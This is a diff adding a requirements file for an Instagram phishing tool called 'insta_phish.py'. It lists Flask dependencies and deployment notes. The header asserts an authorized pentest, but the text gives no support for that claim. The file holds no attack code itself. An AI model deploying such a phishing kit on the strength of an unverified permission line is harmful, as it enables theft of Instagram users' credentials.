@@ -1,0 +1,18 @@
+# Instagram Smart Phishing Pentest v4.0 - Requirements
+# Authorized Pentest Confirmed - User has explicit permission
+# Deploy: pip install -r requirements.txt && python3 insta_phish.py
+
+Flask==3.0.3
+Werkzeug==3.0.4
+Jinja2==3.1.4
+itsdangerous==2.2.0
+click==8.1.7
+MarkupSafe==2.1.5
+
+# Optional: Enhanced logging & analytics (not required)
+gunicorn==22.0.0
+# gevent==24.2.1  # Uncomment for high concurrency
+
+# Production deployment (optional)
+# nginx (system package)
+# supervisor (system package)
